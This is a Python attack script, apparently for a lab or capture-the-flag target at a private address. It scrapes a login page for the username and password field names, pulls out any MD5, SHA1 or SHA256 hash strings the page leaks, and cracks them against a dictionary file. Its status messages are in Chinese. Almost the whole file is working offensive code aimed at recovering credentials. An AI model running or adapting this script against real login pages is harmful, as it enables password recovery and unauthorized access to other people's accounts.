import requests
import re
import hashlib

TARGET_URL = "http://10.0.162.113:80/login"
DICT_FILE = "dict.txt" 

def crack_hash(hash_value, hash_type="md5"):
    try:
        with open(DICT_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                word = line.strip()
                if not word:
                    continue
                
                if hash_type == "md5":
                    h = hashlib.md5(word.encode()).hexdigest()
                elif hash_type == "sha1":
                    h = hashlib.sha1(word.encode()).hexdigest()
                elif hash_type == "sha256":
                    h = hashlib.sha256(word.encode()).hexdigest()
                else:
                    h = hashlib.md5(word.encode()).hexdigest()
                
                if h == hash_value.lower():
                    return word
    except FileNotFoundError:
        print(f"[-] 字典文件 {DICT_FILE} 未找到，跳过哈希破解。")
    return None

def main():
    try:
        response = requests.get(TARGET_URL, timeout=10)
        html = response.text
        
        print("[+] 完整HTML内容:")
        print(html)
        print("-" * 50)
        
        input_fields = re.findall(r'<input[^>]*>', html, re.IGNORECASE)
        username_field = None
        password_field = None
        
        for field in input_fields:
            name_match = re.search(r'name=["\']([^"\']+)["\']', field, re.IGNORECASE)
            type_match = re.search(r'type=["\']([^"\']+)["\']', field, re.IGNORECASE)
            
            if name_match:
                name = name_match.group(1)
                f_type = type_match.group(1).lower() if type_match else "text"
                
                if f_type == "password":
                    password_field = name
                elif f_type == "text" or f_type == "email":
                    username_field = name
        
        print(f"[+] 用户名字段名: {username_field}")
        print(f"[+] 密码字段名: {password_field}")
        print("-" * 50)
        
        hash_patterns = [
            (r'\b([a-f0-9]{32})\b', 'md5'),
            (r'\b([a-f0-9]{40})\b', 'sha1'),
            (r'\b([a-f0-9]{64})\b', 'sha256')
        ]
        
        for pattern, h_type in hash_patterns:
            hashes = re.findall(pattern, html)
            for h in hashes:
                print(f"[!] 发现可能的 {h_type} 哈希: {h}")
                cracked = crack_hash(h, h_type)
                if cracked:
                    print(f"[+] 哈希破解成功: {h} -> {cracked}")
                else:
                    print(f"[-] 未能破解哈希: {h}")

    except requests.exceptions.RequestException as e:
        print(f"[-] 请求失败: {e}")

if __name__ == "__main__":
    main()